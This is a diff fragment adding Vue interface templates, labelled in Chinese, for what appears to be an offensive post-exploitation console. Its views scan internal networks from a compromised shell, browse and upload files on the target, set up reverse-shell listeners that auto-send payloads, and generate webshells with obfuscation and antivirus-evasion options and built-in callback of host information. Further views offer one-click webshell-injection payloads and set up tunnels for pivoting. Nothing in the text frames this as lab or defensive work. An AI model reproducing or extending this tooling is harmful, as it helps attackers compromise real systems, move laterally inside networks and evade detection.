+          <span class="grow muted tiny">执行结果会实时回显到虚拟终端，并写入操作时间线。</span>
+          <button class="btn" @click="ui.modal = null">关闭</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</script>
+
+<!-- ============================= 模板：资产探测 ============================= -->
+<script type="text/x-template" id="tpl-recon">
+  <div class="view view-recon view-fill">
+    <div class="view-head">
+      <div>
+        <h2>资产探测</h2>
+        <p class="muted">拿到 Shell 后：① 收集内网信息 → ② 上传扫描器扫内网 → ③ 结果一键导入资产表 / 拓扑</p>
+      </div>
+      <div class="view-head-actions">
+        <select class="input input-sm" v-model="shellId" style="width:280px" v-if="shells.length">
+          <option v-for="s in shells" :key="s.id" :value="s.id">
+            {{ ipOf(s.hostId) }} · {{ s.type }}{{ s.alive ? '' : '（断线）' }}
+          </option>
+        </select>
+        <button class="btn btn-sm" @click="loadEnv()" :disabled="!shellId || envLoading">
+          {{ envLoading ? '收集中…' : '① 收集内网信息' }}
+        </button>
+      </div>
+    </div>
+
+    <div class="empty-cell" v-if="!shellId">
+      暂无 Shell 会话：请先到「Shell 管理」登记入口马，或到「反弹 Shell」建立通道。
+      <button class="btn btn-xs btn-primary" @click="goto('shell')" style="margin-left:8px">去 Shell 管理</button>
+    </div>
+
+    <div class="recon-body" v-else>
+      <!-- ① 信息收集 -->
+      <div class="panel">
+        <div class="panel-head">
+          <h3>① 内网信息收集 <span class="badge badge-idle" v-if="env">{{ env.platform }}</span></h3>
+          <span class="muted tiny" v-if="env">耗时 {{ env.ms }}ms</span>
+        </div>
+        <div class="panel-body">
+          <p class="muted tiny" v-if="!env && !envLoading">
+            执行 <code class="mono">ip addr / ifconfig</code> + <code class="mono">cat /etc/hosts</code> + 路由 + ARP，
+            识别这台机器还能摸到哪些网段。
+          </p>
+          <p class="text-err" v-if="envError">{{ envError }}</p>
+          <template v-if="env">
+            <div class="recon-segs">
+              <span class="muted tiny">发现网段（点击填入扫描目标）：</span>
+              <button class="chip" v-for="seg in env.segments" :key="seg"
+                      :class="{ 'is-on': segment === seg }" @click="segment = seg">{{ seg }}</button>
+              <span class="muted tiny" v-if="!env.segments.length">未识别到网段，可手动填写</span>
+            </div>
+            <div class="recon-grid">
+              <div>
+                <h4>网卡</h4>
+                <table class="table table-sm">
+                  <thead><tr><th>网卡</th><th>IP</th><th>网段</th></tr></thead>
+                  <tbody>
+                    <tr v-for="i in env.ifaces" :key="i.iface + i.ip">
+                      <td class="mono">{{ i.iface }}</td>
+                      <td class="mono">{{ i.ip }}</td>
+                      <td class="mono muted">{{ i.segment }}</td>
+                    </tr>
+                    <tr v-if="!env.ifaces.length"><td colspan="3" class="empty-cell">未解析到网卡</td></tr>
+                  </tbody>
+                </table>
+              </div>
+              <div>
+                <h4>/etc/hosts</h4>
+                <table class="table table-sm">
+                  <thead><tr><th>IP</th><th>主机名</th></tr></thead>
+                  <tbody>
+                    <tr v-for="h in env.hostsFile" :key="h.ip">
+                      <td class="mono">{{ h.ip }}</td>
+                      <td class="ellipsis" :title="h.names.join(' ')">{{ h.names.join(' ') }}</td>
+                    </tr>
+                    <tr v-if="!env.hostsFile.length"><td colspan="2" class="empty-cell">无记录</td></tr>
+                  </tbody>
+                </table>
+              </div>
+              <div>
+                <h4>路由</h4>
+                <table class="table table-sm">
+                  <thead><tr><th>目标</th><th>网关</th><th>网卡</th></tr></thead>
+                  <tbody>
+                    <tr v-for="r in env.routes.slice(0, 8)" :key="r.dst + r.via">
+                      <td class="mono">{{ r.dst }}</td>
+                      <td class="mono muted">{{ r.via || '—' }}</td>
+                      <td class="mono muted">{{ r.dev || '—' }}</td>
+                    </tr>
+                    <tr v-if="!env.routes.length"><td colspan="3" class="empty-cell">无路由</td></tr>
+                  </tbody>
+                </table>
+              </div>
+              <div>
+                <h4>ARP / 邻居</h4>
+                <table class="table table-sm">
+                  <thead><tr><th>IP</th><th>MAC</th><th>状态</th></tr></thead>
+                  <tbody>
+                    <tr v-for="a in env.arp.slice(0, 8)" :key="a.ip">
+                      <td class="mono">{{ a.ip }}</td>
+                      <td class="mono muted">{{ a.mac || '—' }}</td>
+                      <td><span class="badge badge-ok" v-if="knownSet[a.ip]">已在库</span>
+                          <span class="muted tiny" v-else>未登记</span></td>
+                    </tr>
+                    <tr v-if="!env.arp.length"><td colspan="3" class="empty-cell">无邻居表</td></tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </template>
+        </div>
+      </div>
+
+      <!-- ② 扫描内网 -->
+      <div class="panel">
+        <div class="panel-head"><h3>② 扫描内网</h3></div>
+        <div class="panel-body form-grid">
+          <label class="field">
+            <span>目标网段</span>
+            <input class="input mono" v-model="segment" placeholder="10.10.20.0/24" />
+          </label>
+          <label class="field">
+            <span>端口（逗号分隔）</span>
+            <input class="input mono" v-model="ports" />
+          </label>
+          <label class="field">
+            <span>扫描方式</span>
+            <select class="input" v-model="scannerMode">
+              <option value="local" v-if="scanners.length">本地扫描器（tools/ 内置）</option>
+              <option value="builtin">内置轻量探测（仅 Linux /24，慢）</option>
+              <option value="upload">上传扫描器</option>
+            </select>
+          </label>
+          <label class="field">
+            <span>超时（秒）</span>
+            <input class="input mono" type="number" v-model.number="timeoutS" min="10" max="600" />
+          </label>
+          <label class="field field-full" v-if="scannerMode === 'local'">
+            <span>内置扫描器（目标平台 {{ targetPlatform === 'windows' ? 'Windows' : 'Linux' }}）</span>
+            <div class="row-gap">
+              <select class="input" v-model="localScanner" style="width:220px">
+                <option v-for="s in localScanners" :key="s.key" :value="s.key">
+                  {{ s.label }} · {{ fmtSize(s.size) }}
+                </option>
+              </select>
+              <span class="muted tiny" v-if="!localScanners.length">
+                tools/ 里没有适配该平台的扫描器（Linux 目标需要 fscan_linux）
+              </span>
+              <label class="checkbox-line"><input type="checkbox" v-model="forceUpload" />
+                <span class="muted tiny">强制重新上传</span></label>
+            </div>
+          </label>
+          <div class="field field-full" v-if="scannerMode === 'upload'">
+            <span>扫描器二进制（目标为 Linux 时需 Linux 版）</span>
+            <div class="row-gap">
+              <button class="btn btn-sm" @click="pickScanner()">{{ scannerName || '选择本地文件…' }}</button>
+              <span class="muted tiny" v-if="scannerSize">{{ fmtSize(scannerSize) }}</span>
+              <label class="checkbox-line"><input type="checkbox" v-model="forceUpload" />
+                <span class="muted tiny">强制重新上传（目标已有同名文件时默认跳过）</span></label>
+              <span class="muted tiny" v-if="!scannerB64">未选择时不能扫描</span>
+            </div>
+          </div>
+          <label class="field field-full" v-if="scannerMode !== 'builtin'">
+            <span>命令模板（{SCANNER} {SEGMENT} {PORTS} {EXTRA}）</span>
+            <input class="input mono" v-model="template" :placeholder="defaultTemplate" />
+          </label>
+          <label class="field field-full" v-if="scannerMode !== 'builtin'">
+            <span>额外参数</span>
+            <input class="input mono" v-model="extraArgs" placeholder="如 -nobr -t 500" />
+          </label>
+          <label class="field field-full" v-if="scannerMode !== 'builtin'">
+            <span>目标暂存目录（靶机权限受限时改成可写目录）</span>
+            <input class="input mono" v-model="remoteDir" :placeholder="defaultRemoteDir" />
+          </label>
+          <p class="field-full muted tiny" v-if="scannerMode !== 'builtin' && remoteDir">
+            扫描器将上传到 <code class="mono">{{ remoteDir }}</code>（留空则用默认 {{ defaultRemoteDir }}）
+          </p>
+          <div class="field-full row-gap">
+            <button class="btn btn-primary" @click="runScan()"
+                    :disabled="scanning || !segment
+                      || (scannerMode === 'upload' && !scannerB64)
+                      || (scannerMode === 'local' && !localScanner)">
+              {{ scanning ? '扫描中…' : '② 开始扫描' }}
+            </button>
+            <button class="btn btn-danger" v-if="scanning" @click="cancelScan()">取消</button>
+            <label class="checkbox-line"><input type="checkbox" v-model="probeTitles" />
+              <span class="muted tiny">抓取 Web 标题</span></label>
+            <span class="muted tiny" v-if="scanning">已耗时 {{ live.elapsed }}s · 日志实时推送</span>
+            <span class="muted tiny" v-else-if="scanResult">耗时 {{ (scanResult.ms / 1000).toFixed(1) }}s</span>
+          </div>
+        </div>
+        <div class="panel-body" v-if="scanResult">
+          <p class="muted tiny mono" v-if="scanResult.cmd">命令：{{ scanResult.cmd }}</p>
+          <p class="text-err" v-if="scanResult.error">{{ scanResult.error }}</p>
+          <p class="muted tiny" v-if="scanResult.scannerPath">扫描器：<code class="mono">{{ scanResult.scannerPath }}</code>
+            <span v-if="scanResult.cached"> · 命中目标侧缓存（未重复上传）</span></p>
+        </div>
+      </div>
+
+      <!-- ②-2 实时日志：后台任务流式输出（反弹 Shell 会话同步镜像到交互终端） -->
+      <div class="panel" v-if="scanning || liveLines.length || live.status === 'cancelled' || live.status === 'error'">
+        <div class="panel-head">
+          <h3>
+            实时日志
+            <span class="badge" :class="live.status === 'running' || live.status === 'starting' ? 'badge-info'
+              : live.status === 'done' ? 'badge-ok' : live.status === 'cancelled' ? 'badge-idle' : 'badge-err'">
+              {{ live.status === 'starting' ? '启动中' : live.status === 'running' ? '扫描中'
+                : live.status === 'done' ? '已完成' : live.status === 'cancelled' ? '已取消' : '失败' }}
+            </span>
+            <span class="badge badge-info" v-if="isReverse">反弹通道 · 同步到交互终端</span>
+            <span class="badge badge-warn" v-else-if="currentShell">HTTP 马 · 结束后一次性回显</span>
+          </h3>
+          <div class="row-gap">
+            <span class="muted tiny" v-if="scanning">已耗时 {{ live.elapsed }}s</span>
+            <button class="btn btn-xs" @click="openTerminal()" :disabled="!shellId">
+              <svg class="ico" viewBox="0 0 24 24" v-html="icon('terminal')"></svg>
+              打开交互终端
+            </button>
+            <button class="btn btn-xs btn-danger" v-if="scanning" @click="cancelScan()">取消扫描</button>
+            <button class="btn btn-xs btn-ghost" @click="clearLog()">清空</button>
+          </div>
+        </div>
+        <div class="term term-log" ref="logEl">
+          <div class="term-line" v-for="(l, i) in liveLines" :key="i" :class="'term-' + l.kind">{{ l.line }}</div>
+          <div class="term-line term-dim" v-if="!liveLines.length">{{ scanning ? '等待扫描器输出…' : (live.error || '无输出') }}</div>
+        </div>
+      </div>
+
+      <!-- ③ 结果导入 -->
+      <div class="panel" v-if="scanResult && scanResult.hosts">
+        <div class="panel-head">
+          <h3>③ 扫描结果 · {{ scanResult.hosts.length }} 台</h3>
+          <div class="row-gap">
+            <button class="btn btn-xs" @click="toggleAll()" v-if="scanResult.hosts.length">
+              {{ allSelected ? '取消全选' : '全选' }}
+            </button>
+            <button class="btn btn-xs btn-primary" @click="importSelected()"
+                    :disabled="!selectedCount || importing">
+              {{ importing ? '导入中…' : '导入选中（' + selectedCount + '）' }}
+            </button>
+          </div>
+        </div>
+        <div class="table-wrap">
+          <table class="table table-sm">
+            <thead>
+              <tr>
+                <th style="width:34px"></th><th>IP</th><th>主机名</th>
+                <th>端口 / 服务</th><th>Web 标题</th><th>线索</th><th style="width:80px">状态</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr v-for="h in scanResult.hosts" :key="h.ip"
+                  :class="{ 'is-selected': selected[h.ip] }" @click="selected[h.ip] = !selected[h.ip]">
+                <td><input type="checkbox" :checked="!!selected[h.ip]" @click.stop="selected[h.ip] = !selected[h.ip]" /></td>
+                <td class="mono">{{ h.ip }}</td>
+                <td>{{ h.hostname || '—' }}</td>
+                <td class="mono">{{ portText(h) }}</td>
+                <td class="tiny ellipsis" :title="titleText(h)">{{ titleText(h) || '—' }}</td>
+                <td class="muted tiny ellipsis" :title="h.note">{{ h.note }}</td>
+                <td><span class="badge badge-idle" v-if="knownSet[h.ip]">已在库</span>
+                    <span class="badge badge-ok" v-else>新发现</span></td>
+              </tr>
+              <tr v-if="!scanResult.hosts.length">
+                <td colspan="7" class="empty-cell">未解析到主机（可展开下方原始回显确认）</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="panel-body" v-if="scanResult.output">
+          <details>
+            <summary class="muted tiny">查看原始回显</summary>
+            <pre class="code-block code-sm">{{ scanResult.output }}</pre>
+          </details>
+        </div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：文件管理 ============================= -->
+<script type="text/x-template" id="tpl-files">
+  <div class="view view-files view-fill">
+    <div class="view-head">
+      <div>
+        <h2>文件管理</h2>
+        <p class="muted">经会话层真实浏览目标文件系统 · 读取 / 在线编辑 / 上传 / 下载，全部落到目标机上</p>
+      </div>
+      <div class="view-head-actions">
+        <div class="seg" title="上传通道：HTTP 拉取 = 攻击机起临时 HTTP 服务，目标机用 curl/wget 等自取（按字节数校验）；自动 = 拉取失败回退分片">
+          <button class="seg-btn" :class="{ 'is-active': uploadMode === 'pull' }" @click="setMode('pull')">HTTP 拉取</button>
+          <button class="seg-btn" :class="{ 'is-active': uploadMode === 'chunk' }" @click="setMode('chunk')">分片直传</button>
+          <button class="seg-btn" :class="{ 'is-active': uploadMode === 'auto' }" @click="setMode('auto')">自动</button>
+        </div>
+        <select class="input input-sm" v-model="shellId" style="width:280px" v-if="shells.length">
+          <option v-for="s in shells" :key="s.id" :value="s.id">
+            {{ ipOf(s.hostId) }} · {{ s.type }}{{ s.alive ? '' : '（断线）' }}
+          </option>
+        </select>
+        <button class="btn btn-sm" @click="refresh()" :disabled="!fs.shellId">刷新</button>
+        <button class="btn btn-sm" @click="detectTools()" :disabled="!fs.shellId || fs.toolsLoading">
+          {{ fs.toolsLoading ? '检测中…' : '检测下载工具' }}
+        </button>
+        <button class="btn btn-sm btn-primary" @click="upload()" :disabled="!fs.shellId || fs.uploading">上传文件</button>
+      </div>
+    </div>
+
+    <div class="panel file-panel-full" v-if="fs.shellId">
+      <div class="path-bar">
+        <div class="crumb mono">
+          <button class="crumb-btn" v-for="(c, i) in fs.crumbs" :key="i" @click="cd(i)">{{ c }}{{ i ? '/' : '' }}</button>
+        </div>
+        <div class="path-jump">
+          <input class="input input-sm mono" v-model="pathInput" placeholder="/etc" @keydown.enter="go()" />
+          <button class="btn btn-sm" @click="go()">跳转</button>
+          <button class="btn btn-sm" @click="up()" :disabled="fs.crumbs.length <= 1">上一级</button>
+        </div>
+      </div>
+
+      <div class="stage-tools tiny">
+        <span class="muted">目标可用下载工具：</span>
+        <template v-if="fs.tools && fs.tools.length">
+          <span class="badge badge-info mono" v-for="t in fs.tools" :key="t.key">{{ t.label }}</span>
+        </template>
+        <span class="muted" v-else-if="fs.toolsLoading">检测中…</span>
+        <span class="text-err" v-else-if="fs.toolsError">探测失败：{{ fs.toolsError }}</span>
+        <span class="muted" v-else>未检测到（点右上「检测下载工具」重试，或改用分片直传）</span>
+      </div>
+
+      <div class="table-wrap file-table">
+        <table class="table">
+          <thead>
+            <tr>
+              <th style="width:38px"></th>
+              <th>名称</th>
+              <th style="width:84px">类型</th>
+              <th style="width:104px">大小</th>
+              <th style="width:150px">修改时间</th>
+              <th style="width:150px">操作</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr v-for="f in fs.entries" :key="f.name" @click="f.dir ? enter(f) : open(f)">
+              <td><svg class="ico" viewBox="0 0 24 24" v-html="icon(f.dir ? 'folder' : 'file')"></svg></td>
+              <td class="mono ellipsis" :title="f.name">{{ f.name }}</td>
+              <td><span class="badge" :class="f.dir ? 'badge-info' : 'badge-idle'">{{ f.dir ? '目录' : '文件' }}</span></td>
+              <td class="mono muted">{{ f.dir ? '—' : f.size }}</td>
+              <td class="muted mono">{{ f.mtime || '—' }}</td>
+              <td>
+                <button class="btn btn-xs" v-if="f.dir" @click.stop="enter(f)">打开</button>
+                <template v-else>
+                  <button class="btn btn-xs" @click.stop="open(f)">编辑</button>
+                  <button class="btn btn-xs" @click.stop="download(f)">下载</button>
+                </template>
+              </td>
+            </tr>
+            <tr v-if="fs.loading"><td colspan="6" class="empty-cell">加载中…</td></tr>
+            <tr v-else-if="fs.error"><td colspan="6" class="empty-cell text-err">列目录失败：{{ fs.error }}</td></tr>
+            <tr v-else-if="!fs.entries.length"><td colspan="6" class="empty-cell">目录为空</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="upload-bar" v-if="fs.uploading">
+        <span class="mono grow">上传 {{ fs.uploading }}…{{ fs.phase ? ' · ' + fs.phase : '' }}</span>
+        <div class="progress"><i :style="{ width: fs.progress + '%' }"></i></div>
+      </div>
+      <p class="muted tiny">当前路径 <b class="mono">{{ fs.cwd }}</b> · 上传通道「{{ uploadModeText() }}」：
+        HTTP 拉取由攻击机临时起 HTTP 服务、目标机 curl/wget 自取并按字节数校验；分片直传经会话层分块落盘。</p>
+    </div>
+
+    <div class="empty-cell" v-else>
+      暂无 Shell 会话：请先到「Shell 管理」登记入口马，或到「反弹 Shell」建立通道。
+      <button class="btn btn-xs btn-primary" @click="goto('shell')" style="margin-left:8px">去 Shell 管理</button>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：反弹 Shell ============================= -->
+<script type="text/x-template" id="tpl-reverse">
+  <div class="view view-reverse">
+    <div class="view-head">
+      <div>
+        <h2>反弹 Shell</h2>
+        <p class="muted">WebShell 伪终端 → 攻击机监听 → 靶机回连 → 登记为交互会话 · 攻击机 = 面板所在机器</p>
+      </div>
+      <div class="view-head-actions">
+        <div class="seg">
+          <button class="seg-btn" :class="{ 'is-active': mode === 'semi' }" @click="mode = 'semi'">半自动档</button>
+          <button class="seg-btn" :class="{ 'is-active': mode === 'auto' }" @click="mode = 'auto'">全自动档</button>
+        </div>
+        <button class="btn btn-sm" @click="refreshListeners()">刷新监听</button>
+        <button class="btn btn-sm btn-danger" @click="closeAll()">清理全部监听</button>
+      </div>
+    </div>
+
+    <div class="rev-grid">
+      <!-- 左：参数与载荷 -->
+      <div class="panel">
+        <div class="panel-head">
+          <h3>① 参数与载荷</h3>
+          <span class="muted tiny">{{ mode === 'auto' ? '开监听后自动下发命令' : '开监听后手动执行命令' }}</span>
+        </div>
+        <div class="form-stack">
+          <label class="field">
+            <span>在哪个 WebShell 会话里执行</span>
+            <select class="input" v-model="shellId">
+              <option v-for="s in wsShells" :key="s.id" :value="s.id">
+                {{ ipOf(s.hostId) }} · {{ s.type }} · {{ s.alive ? '存活' : '断线' }}
+              </option>
+            </select>
+          </label>
+          <div class="form-row">
+            <label class="field">
+              <span>攻击机监听地址</span>
+              <input class="input mono" v-model="bind" placeholder="10.8.0.12" />
+            </label>
+            <label class="field">
+              <span>端口</span>
+              <input class="input mono" v-model.number="port" />
+            </label>
+          </div>
+          <p class="muted tiny" v-if="detected.length">
+            本机当前地址：<span class="mono">{{ detected.join(' / ') }}</span>
+            <button class="btn btn-xs btn-ghost" @click="useDetected()">使用检测到的地址</button>
+          </p>
+          <label class="field">
+            <span>反弹载荷</span>
+            <select class="input" v-model="kind">
+              <option v-for="k in kinds" :key="k.key" :value="k.key">{{ k.label }}</option>
+            </select>
+          </label>
+          <pre class="code-block code-xs"><code>{{ payload() }}</code></pre>
+          <div class="row-gap">
+            <button class="btn btn-primary" :disabled="running" @click="start()">{{ running ? '监听中…' : '① 开始监听' }}</button>
+            <button class="btn" :disabled="!running" @click="send()">② 发送到该会话</button>
+            <button class="btn" @click="copyPayload()">复制命令</button>
+          </div>
+          <p class="muted tiny">
+            全自动档：点「① 开始监听」会同时把命令下发到上面选中的会话；回连后自动登记，
+            可在下方「反弹会话」里直接打开终端。半自动档只开监听，命令自己复制执行。
+          </p>
+        </div>
+      </div>
+
+      <!-- 右：监听与回连 -->
+      <div class="panel">
+        <div class="panel-head">
+          <h3>② 监听与回连</h3>
+          <span class="muted tiny">{{ listeners.length }} 个监听 · {{ reverseShells.length }} 个反弹会话</span>
+        </div>
+        <div class="rev-log" v-if="log.length">
+          <div v-for="(l, i) in log" :key="i" class="mono tiny" :class="'term-' + l.k">{{ l.text }}</div>
+        </div>
+        <p class="muted tiny" v-else>还没有操作：选好会话与载荷，点「① 开始监听」。</p>
+
+        <table class="table" v-if="listeners.length">
+          <thead><tr><th>监听地址</th><th>回连状态</th><th style="width:80px">操作</th></tr></thead>
+          <tbody>
+            <tr v-for="l in listeners" :key="l.id">
+              <td class="mono">{{ l.bind }}:{{ l.port }}</td>
+              <td>
+                <span class="badge" :class="l.connected ? 'badge-ok' : 'badge-idle'">
+                  {{ l.connected ? '已回连 ' + (((l.peer || [])[0]) || '') : '等待中' }}
+                </span>
+              </td>
+              <td><button class="btn btn-xs btn-danger" @click="closeOne(l.id)">关闭</button></td>
+            </tr>
+          </tbody>
+        </table>
+
+        <div class="panel-sub" v-if="reverseShells.length">
+          <h4>反弹会话</h4>
+          <div class="list-row" v-for="s in reverseShells" :key="s.id">
+            <span class="dot" :class="s.alive ? 'is-on' : 'is-off'"></span>
+            <span class="mono grow">{{ s.url }} · {{ s.latency }}ms</span>
+            <button class="btn btn-xs" @click="openSession(s.id)">打开终端</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：马生成器 ============================= -->
+<script type="text/x-template" id="tpl-generator">
+  <div class="view view-generator">
+    <div class="view-head">
+      <div>
+        <h2>Webshell 生成器</h2>
+        <p class="muted">一键生成 PHP / JSP / ASP / ASPX 一句话马与自定义加密马，支持混淆模板（字符串拼接 / assert 变体 / 免杀参数化）。</p>
+      </div>
+      <div class="view-head-actions">
+        <button class="btn btn-sm" @click="copy(code)">复制代码</button>
+        <button class="btn btn-sm" @click="download()">下载文件</button>
+      </div>
+    </div>
+
+    <div class="gen-grid">
+      <div class="panel">
+        <div class="panel-head"><h3>生成参数</h3></div>
+        <div class="form-stack">
+          <label class="field">
+            <span>脚本类型</span>
+            <div class="seg seg-full">
+              <button v-for="t in langs" :key="t" class="seg-btn" :class="{ 'is-active': form.lang === t }" @click="form.lang = t; build()">{{ t }}</button>
+            </div>
+          </label>
+          <label class="field">
+            <span>马形态</span>
+            <select class="input" v-model="form.kind" @change="build()">
+              <option value="oneshell">一句话马（菜刀 / 蚁剑格式）</option>
+              <option value="custom">自定义加密马（AES 通信）</option>
+            </select>
+          </label>
+          <label class="field">
+            <span>参数名</span>
+            <input class="input mono" v-model="form.param" @input="build()" />
+          </label>
+          <label class="field" v-if="form.kind === 'custom'">
+            <span>AES 密钥（16/24/32 字节）</span>
+            <input class="input mono" v-model="form.key" @input="build()" />
+          </label>
+          <label class="field">
+            <span>混淆模板</span>
+            <select class="input" v-model="form.obf" @change="build()">
+              <option value="none">不混淆</option>
+              <option value="concat">字符串拼接</option>
+              <option value="assert">assert 变体</option>
+              <option value="param">免杀参数化</option>
+              <option value="base64">Base64 编码载荷</option>
+            </select>
+          </label>
+          <label class="field checkbox-line">
+            <input type="checkbox" v-model="form.autoCollect" @change="build()" />
+            <span>内嵌基础信息收集回传（whoami / uname / ip / 网卡列表）</span>
+          </label>
+          <div class="callout">
+            <b>用法提示</b>
+            <p class="muted tiny">生成后在「Shell 管理」登记 URL 与参数名即可连接；若目标可写文件，可用「Shell 注入辅助」里的写马姿势直接落盘。</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-head">
+          <h3>生成结果</h3>
+          <span class="badge badge-info mono">{{ filename }}</span>
+        </div>
+        <pre class="code-block"><code>{{ code }}</code></pre>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-head">
+        <h3>Shell 注入辅助 · 常见写马姿势速查</h3>
+        <span class="muted tiny">选中目标主机后变量自动替换</span>
+      </div>
+      <div class="inject-grid">
+        <div class="inject-card" v-for="t in tips" :key="t.id">
+          <div class="inject-head">
+            <b>{{ t.title }}</b>
+            <span class="badge badge-warn">{{ t.scene }}</span>
+          </div>
+          <pre class="code-block code-sm"><code>{{ render(t.payload, t.hostId) }}</code></pre>
+          <div class="inject-vars">
+            <span class="muted tiny">已按目标替换：</span>
+            <span class="badge badge-info mono" v-for="v in replacedVars(t.payload)" :key="v">{{ v }}</span>
+          </div>
+          <div class="inject-foot">
+            <select class="input input-sm" v-model="t.hostId" style="max-width:190px">
+              <option v-for="h in hosts" :key="h.id" :value="h.id">{{ h.ip }} · {{ h.hostname || h.os }}</option>
+            </select>
+            <button class="btn btn-xs" @click="copy(render(t.payload, t.hostId))">复制 payload</button>
+            <button class="btn btn-xs btn-primary" @click="tryInject(t)">一键尝试</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：代理编排 ============================= -->
+<script type="text/x-template" id="tpl-proxy">
+  <div class="view view-proxy">
+    <div class="view-head">
+      <div>
+        <h2>代理编排台</h2>
+        <p class="muted">出网探测 → 隧道选型 → 两档自动化部署 → 回连登记 → 统一 Socks 入口 → 健康看板</p>
+      </div>
+      <div class="view-head-actions">
+        <div class="seg">
+          <button class="seg-btn" :class="{ 'is-active': !compose.autoDeploy }" @click="compose.autoDeploy = false">半自动档</button>
+          <button class="seg-btn" :class="{ 'is-active': compose.autoDeploy }" @click="compose.autoDeploy = true">自动档</button>
+        </div>
+        <button class="btn btn-sm" @click="genProxychains()">生成 proxychains 配置</button>
+        <button class="btn btn-sm" @click="genMsf()">生成 msf route 片段</button>
+        <button class="btn btn-sm" @click="openToolSettings()">
+          <svg class="ico" viewBox="0 0 24 24" v-html="icon('settings')"></svg>
+          代理工具设置
+          <span class="badge badge-info mono" style="margin-left:2px">{{ toolOptions.length }}</span>
+        </button>
+        <button class="btn btn-sm btn-primary" @click="ui.modal = 'attack-cfg'">
+          <svg class="ico" viewBox="0 0 24 24" v-html="icon('server')"></svg>
+          攻击机网络
+          <span class="badge badge-info mono" style="margin-left:2px">{{ compose.attackIp }}</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="proxy-grid">
+      <!-- ① 跳板机与链路参数 -->
+      <div class="panel">
+        <div class="panel-head">
+          <h3>① 跳板机与链路参数</h3>
+          <span class="muted tiny">出网探测在右侧自动执行</span>
+        </div>
+        <div class="form-stack">
+
+          <label class="field">
+            <span>跳板机（从哪台机器起隧道）</span>
+            <div class="pivot-row">
+              <select class="input" v-model="compose.fromHostId">
+                <option v-for="h in hosts" :key="h.id" :value="h.id">
+                  {{ h.ip }} · {{ h.layer }} · {{ (h.ifaces || []).length > 1 ? '双网卡' : '单网卡' }} · {{ h.privilege || '未知权限' }}
+                </option>
+              </select>
+              <button class="btn btn-sm" :class="detect.done ? 'btn-primary' : ''" @click="ui.modal = 'probe'" :disabled="detect.running">
+                <svg class="ico" viewBox="0 0 24 24" v-html="icon('radar')"></svg>
+                {{ detect.running ? '探测中…' : '出网探测' }}
+              </button>
+            </div>
+            <p class="pivot-hint">
+              <span class="badge" :class="detect.running ? 'badge-warn' : detect.done ? 'badge-ok' : 'badge-idle'">
+                {{ detect.running ? '探测中…' : detect.done ? '已完成' : '未探测' }}
+              </span>
+              <span class="muted tiny" v-if="detect.done">推荐 <b class="text-ok">{{ detect.recommend }}</b></span>
+              <span class="muted tiny" v-else>选完跳板机会自动探测，也可点按钮查看详情</span>
+            </p>
+          </label>
+
+          <!-- 链路类型 -->
+          <div class="field">
+            <span>链路类型</span>
+            <div class="linktype-grid">
+              <button v-for="t in linkTypes" :key="t.key" class="linktype-card" :class="{ 'is-active': compose.linkType === t.key }" @click="compose.linkType = t.key">
+                <b>{{ t.label }}</b>
+                <small>{{ t.desc }}</small>
+              </button>
+            </div>
+          </div>
+
+          <div class="form-row">
+            <label class="field">
+              <span>隧道工具</span>
+              <select class="input" v-model="compose.tool">
+                <option v-for="t in toolOptions" :key="t.name" :value="t.name">{{ t.name }} — {{ t.note }}</option>
+                <option v-if="!toolOptions.length" value="">（未启用任何工具，请点右上角「代理工具设置」）</option>
+              </select>
+            </label>
+            <label class="field">
+              <span>靶机绑定地址</span>
+              <select class="input mono" v-model="compose.bindAddr">
+                <option value="0.0.0.0">0.0.0.0（所有网卡）</option>
+                <option value="127.0.0.1">127.0.0.1（仅本机）</option>
+              </select>
+            </label>
+          </div>
+
+          <div class="form-row">
+            <label class="field">
+              <span>{{ compose.linkType === 'portfwd' ? '攻击机本地端口' : '攻击机 Socks 端口' }}</span>
+              <input class="input mono" v-model.number="compose.localPort" />
+            </label>
+            <label class="field" v-if="compose.linkType === 'portfwd'">
+              <span>目标端口</span>
+              <input class="input mono" v-model.number="compose.targetPort" placeholder="80" />
+            </label>
+            <label class="field" v-else>
+              <span>目标网段（覆盖范围）</span>
+              <input class="input mono" v-model="compose.targetSegment" />
+            </label>
+          </div>
+
+          <label class="field" v-if="compose.linkType === 'portfwd'">
+            <span>目标 IP</span>
+            <input class="input mono" v-model="compose.targetHost" placeholder="10.85.101.3" />
+          </label>
+
+          <label class="field checkbox-line">
+            <input type="checkbox" v-model="compose.autoDeploy" />
+            <span>自动档：经 Webshell 上传二进制（自动识别 OS/架构选包）→ 执行 → 回连 → 登记</span>
+          </label>
+
+          <div class="callout" v-if="compose.linkType === 'relay' && compose.upstream">
+            <b>已自动推导为多级中继</b>
+            <p class="muted tiny">
+              {{ ipOf(compose.fromHostId) }} 无法直接回连攻击机，需先由
+              <span class="mono">{{ ipOf(compose.upstream.fromHostId) }}</span> 把隧道端口暴露到其内网口
+              <span class="mono">{{ relayAddr }}</span>，再由本层双网卡节点接入。
+            </p>
+          </div>
+          <div class="callout" v-if="compose.linkType === 'relay' && !compose.upstream">
+            <b>该节点可直接回连</b>
+            <p class="muted tiny">未发现通往该网段的上层代理，将按单跳 Socks 生成命令。</p>
+          </div>
+
+          <button class="btn btn-primary btn-block" :disabled="compose.deploying || !toolOptions.length" @click="deploy()">
+            {{ compose.deploying ? '部署中…' : (compose.autoDeploy ? '一键部署并登记' : '生成命令与配置') }}
+          </button>
+        </div>
+
+        <!-- 工具联动配置 -->
+        <div class="panel-sub" v-if="proxy.proxychains">
+          <div class="panel-sub-head"><b>proxychains4.conf</b><button class="btn btn-xs" @click="copy(proxy.proxychains)">复制</button></div>
+          <pre class="code-block code-sm"><code>{{ proxy.proxychains }}</code></pre>
+        </div>
+      </div>
+
+      <!-- ② 部署指令 -->
+      <div class="panel">
+        <div class="panel-head">
